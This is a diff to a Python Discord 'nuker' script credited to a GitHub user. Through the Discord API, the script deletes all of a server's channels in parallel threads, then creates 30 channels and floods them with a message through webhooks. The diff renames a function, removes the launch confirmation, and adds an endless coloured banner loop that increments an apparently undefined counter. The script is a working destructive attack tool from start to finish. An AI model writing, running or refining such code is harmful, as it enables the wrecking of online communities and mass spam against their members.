@@ -3,6 +3,7 @@ os.system("pip install requests")
 import requests
 import threading
 import time
+import random
 
 black = "\033[1;30m"
 red = "\033[1;31m"    
@@ -12,6 +13,8 @@ blue = "\033[1;34m"
 purple = "\033[1;35m"    
 cyan = "\033[1;36m"    
 white = "\033[1;37m"    
+
+colors = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"]
 
 def FetchChannels(guild):
     while True:
@@ -59,7 +62,7 @@ def removerole(guild, role):
             else:
                 break
 
-def channel(guild, name):
+def loadchannels(guild, name):
     while True:
         json = {'name': name, 'type': 0}
         r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=json)
@@ -90,7 +93,7 @@ def sendmsgwithwebhook(message, id, token):
             time.sleep(r.json()['retry_after'])
 
 def makeandspam(srvrid, chnlname, msgg):
-    channel_id = channel(srvrid, chnlname)
+    channel_id = loadchannels(srvrid, chnlname)
     webhook_id, webhook_token = webhook(channel_id)
     sendmsgwithwebhook(msgg, webhook_id, webhook_token)
 
@@ -105,7 +108,6 @@ def makeroles(guild, name):
                 break
             else:
                 break
-
 
 os.system("cls || clear")
 os.system("title Koala Nuker Public")
@@ -135,31 +137,35 @@ while True:
 {green}[+]{white} Login Successful
 {green}[KOALA NUKER]{white} This tool is made by github.com/infamouskoala
 
-[0] Wizz and run        [1] Delete Channels
+[0] Fast Nuke           [1] Delete Channels
 [2] Create Channels     [3] Delete Roles
 [4] Create Roles        [5] Contact us
 
 Choice: """, end="")
     option = int(input())
     if option == 0:
+
         print(f"{red}[!]{white} QuickNuke Mode")
         msgint = input("Enter message: ")
         names = input("Channel Names: ")
-        msg = f"{msgint}\nmade by https://github.com/infamouskoala"
-        guild_roles = loadroles(guildid)
+        spammessage = f"{msgint}\nmade by https://github.com/infamouskoala"
+
+        print(f"{green}[+]{white} Deleting existing channels")
         guild_channels = FetchChannels(guildid)
-        print(f'{red}[!]{white} Nuker is ready, Press any key to launch.')
-        print(f"{red}[X]{white} If the nuker is crashing on this window, you're being rate limited")
-        input()
-        for i in guild_channels:
-            # t = threading.Thread(target=removechan, args=(channel['channel-id'],))
+        for channel in guild_channels:
             t = threading.Thread(target=removechan, args=(channel['id'],))
             t.start()
 
+        time.sleep(1)
+    
         for k in range(30):
-            # t = threading.Thread(target=roles, args=(guildid, names, msg,))
-            t = threading.Thread(target=makeandspam, args=(guildid, names, msg,))
+            t = threading.Thread(target=makeandspam, args=(guildid, names, spammessage))
             t.start()
+        
+        while True:
+            pings = pings+1
+            colorchoirce = random.choice(colors)
+            print(f"{colorchoirce}[KOALA NUKER]{white} Koala Nuker {colorchoirce}[KOALA NUKER]{white}", end="\r")
 
     elif option == 1:
         print(f"{green}[+]{white} Deleting channels")
